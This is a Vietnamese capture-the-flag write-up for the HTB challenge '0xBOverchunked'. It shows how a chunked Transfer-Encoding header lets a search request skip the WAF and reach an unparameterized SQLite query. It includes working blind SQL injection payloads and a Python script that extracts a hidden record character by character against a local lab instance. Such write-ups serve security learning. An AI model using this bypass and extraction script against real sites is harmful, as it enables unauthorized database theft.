### 0xBOverchunked
Deploy bài lên thì ta thấy web có chức năng search, search này nhận đầu vào là `id` sau đó truy vấn rồi đưa ra kết quả về post có trong database, nếu có sẽ hiển thị thông tin của post, còn không thì hiển thị `No results yet.`

![[SQL Injection-54.png]]

![[SQL Injection-55.png]]
Ở đây chúng ta chưa có manh mối gì, nên ta sẽ thực hiện đọc source code được cung cấp. Khi truy cập vào thì mình thấy cần quan tâm đến 3 file code này là trọng tâm 
![[SQL Injection-57.png|450]]
Trước hết mình mò vô file `SearchHandler.php`, đập vô mắt là 1 hàm `if {} else {}` khá thú vị như dưới đây:
![[SQL Injection-58.png]]
Có thể thấy, trước khi xử lý dữ liệu đầu vào từ `$_POST['search']`, backend kiểm tra sự tồn tại của phần tử `HTTP_TRANSFER_ENCODING` trong biến Superglobal `$_SERVER`, đồng thời xác định giá trị của phần tử này có bằng `chunked` hay không.
Nếu điều kiện được thỏa mãn, ứng dụng sẽ truyền trực tiếp giá trị `$search` vào hàm `unsafequery()` mà không thông qua cơ chế kiểm tra dữ liệu đầu vào `waf_sql_injection()`. Ngược lại, nếu điều kiện không được thỏa mãn, ứng dụng sẽ kiểm tra sự tồn tại của tham số `search` và thực hiện lọc dữ liệu đầu vào thông qua hàm `waf_sql_injection()` trước khi gọi hàm `safequery()`.

![[SQL Injection-61.png]]
Có thể thấy, hàm `waf_sql_injection()` sử dụng cơ chế Blacklist kết hợp với `stripos()` để lọc các từ khóa và ký tự thường được sử dụng trong SQL Injection. Bên cạnh đó, hàm `safequery()` kiểm soát quyền truy cập đối với bài viết có `id = 6`, đồng thời sử dụng PDO kết hợp với Parameterized Queries để ngăn chặn việc chèn mã SQL thông qua tham số `$id`.
![[SQL Injection-60.png]]

Tuy nhiên, có thể thấy hàm `unsafequery()` sử dụng phương thức `$pdo->query()` và đưa trực tiếp giá trị `$id` vào chuỗi truy vấn SQL mà không sử dụng Parameterized Queries. Điều này cho phép dữ liệu đầu vào tác động trực tiếp đến cấu trúc truy vấn, dẫn đến lỗ hổng SQL Injection. Ngoài ra, hàm này không thực hiện kiểm tra quyền truy cập đối với bài viết có `id = 6` như hàm `safequery()`.
![[SQL Injection-59.png]]

Có thể thấy các hàm chưa có tác động quá nhiều đến việc tìm lỗ hổng nhưng mấu chốt ở đây ta có thể nhận ra là Header `HTTP_TRANSFER_ENCODING`, ta sẽ lợi dụng nó để đưa vào `unsafequery()` mà không cần qua bộ lọc phức tạp, mình sẽ thực hiện bằng các `curl` đến web sao điều kiện thoả mãn điều kiện mà backend kiểm tra

![[SQL Injection-62.png]]

![[SQL Injection-63.png]]

![[SQL Injection-64.png]]

Hai request trên tạo thành một Boolean oracle. Với `search=' OR 1=1-- -`, điều kiện luôn đúng nên `unsafequery()` lấy được một hàng; nhánh `if ($result)` trả `200 OK` cùng chuỗi `No post id found.`. Khi đổi thành `search=' OR 1=2-- -`, truy vấn không có kết quả, `$result` là `false` và ứng dụng trả `500 Internal Server Error`. Dù response không hiển thị dữ liệu của bài viết, khác biệt giữa hai trạng thái này cho phép suy luận từng điều kiện trong database.

Backend dùng SQLite, vì vậy có thể ghép ba trường của bài viết bị chặn bằng toán tử `||`:

```sql
(SELECT group_concat(id || ',' || gamename || ',' || gamedesc)
 FROM posts
 WHERE id = 6)
```

Script `solved.py` gửi request thật sự theo chunked transfer encoding bằng `http.client` với `encode_chunked=True`. Mỗi lần kiểm tra, script đặt điều kiện cần đo vào payload `1' AND (<condition>)-- -`; response chứa `No post id found.` được xem là True, còn `500 Internal Server Error` là False. Trước tiên script thử `length(<query>) = n` để tìm độ dài, sau đó duyệt từng vị trí bằng `substr()` và so sánh với `char(code)`:

```python
def check(condition):
    payload = f"1' AND ({condition})-- -"
    body = urlencode({"search": payload}).encode()

    conn = http.client.HTTPConnection("127.0.0.1", 1337, timeout=10)
    conn.request(
        "POST",
        "/Controllers/Handlers/SearchHandler.php",
        body=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Transfer-Encoding": "chunked",
        },
        encode_chunked=True,
    )

    response = conn.getresponse()
    result = response.read().decode(errors="ignore")
    conn.close()
    return "No post id found." in result
```

Kết quả cho biết chuỗi cần lấy dài 32 ký tự. Lần lượt kiểm tra các mã ASCII từ 32 đến 126 khôi phục được toàn bộ bản ghi `6,Flag,HTB{f4k3_fl4_f0r_t35t1ng}`. Flag của bài là `HTB{f4k3_fl4_f0r_t35t1ng}`.
